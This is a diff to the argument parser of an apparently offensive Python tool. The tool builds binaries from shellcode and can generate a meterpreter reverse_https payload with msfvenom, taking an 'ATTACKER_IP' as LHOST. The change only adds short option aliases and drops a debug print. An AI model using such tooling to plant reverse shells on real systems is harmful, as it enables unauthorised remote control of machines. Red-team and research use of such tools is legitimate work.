@@ -201,9 +201,9 @@ if __name__ == '__main__':
 	parser.add_argument('-a', '--arch', type=str, default=_arch, help="The architecture to use (x86 or x64)")
 	parser.add_argument('-t', '--test', action='store_true', default=False, help="Test to build a default shellcode that spawn a calc.")
 	parser.add_argument('-msf', '--msfvenom', action='store_true', default=False, help="Generate a meterpreter/reverse_https shellcode with msfvenom")
-	parser.add_argument('--lhost', type=str, help="LHOST for msfvenom payload generator ")
-	parser.add_argument('--lport', type=str, default="8443", help="LPORT for msfvenom payload generator (default 8443).")
-	parser.add_argument('--rc', action='store_true', default=False, help="Autorun the resource file with msfconsole (only with --msfvenom")
+	parser.add_argument('-lhost','--lhost', type=str, help="LHOST for msfvenom payload generator ")
+	parser.add_argument('-lport','--lport', type=str, default="8443", help="LPORT for msfvenom payload generator (default 8443).")
+	parser.add_argument('-rc','--rc', action='store_true', default=False, help="Autorun the resource file with msfconsole (only with --msfvenom")
 	parser.add_argument('-o', '--output', type=str, help="The binary name (default is random), build in {0}/".format(_outputdir))
 	args = parser.parse_args()
 	
@@ -250,7 +250,6 @@ if __name__ == '__main__':
 		craftbinary(args.shellcode,_outputdir, _biname, _appdir)
 	elif args.msfvenom == True: 
 		if not args.lhost:
-			print(args.msfvenom)
 			cprint("[-] LHOST is not specify ! Use --lhost ATTACKER_IP. Exiting", "red")
 			sys.exit()
 		# platform,arch,shellcodedir,shellcodename,lhost,lport,params):
